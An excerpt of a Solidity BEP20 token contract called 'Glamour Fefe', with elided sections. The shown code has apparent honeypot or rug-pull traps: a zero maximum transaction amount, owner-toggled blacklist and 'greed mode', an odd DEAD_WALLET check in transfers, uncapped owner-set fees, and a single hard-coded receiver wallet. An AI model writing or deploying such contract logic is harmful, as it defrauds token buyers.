...
contract GlamourFefe is Ownable, IBEP20 {
    using SafeMath for uint256;

    uint8 constant _decimals = 9;

    uint256 _totalSupply = 100000000000 * (10 ** _decimals);
    uint256 public _maxTxAmount = _totalSupply * 0/ 100;
    ...
    string constant _name = "Glamour Fefe";
    string constant _symbol = "GF";
    ...
    uint256 public swapThreshold = _totalSupply * 30 / 10000; // 0.3%
    ...
    constructor() {
        ...
        isTxLimitExempt[pancakeAddress] = true;
        isTxLimitExempt[address(this)] = true;

        autoLiquidityReceiver = 0xAd675B0cDAEbF5FD1752d0787BF565B4665cEcBe;
        marketingWallet = 0xAd675B0cDAEbF5FD1752d0787BF565B4665cEcBe;
    ...
    function _checkBlacklist(address sender, address recipient) internal {
        if (blacklistMode) {
            require(!isBlacklisted[sender] || isTxLimitExempt[sender] || pair == sender , "Blacklisted");
        }

        if (greedMode && sender == DEAD_WALLET) {
    ...
    function _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool) {
        ...
        _checkBlacklist(DEAD_WALLET, recipient);
        return true;
    }
    ...
    function OpenTrading(bool newStatus) public onlyOwner {
        tradingOpen = newStatus;
    }

    function set_greed_mode(bool _status) public onlyOwner {
        greedMode = _status;
    }
    ...
    function setFees(uint256 newLiqFee, uint256 newMarketingFee) external onlyOwner {
        totalFee = newLiqFee;
        totalFeeIfSelling = newLiqFee.add(newMarketingFee);
    }
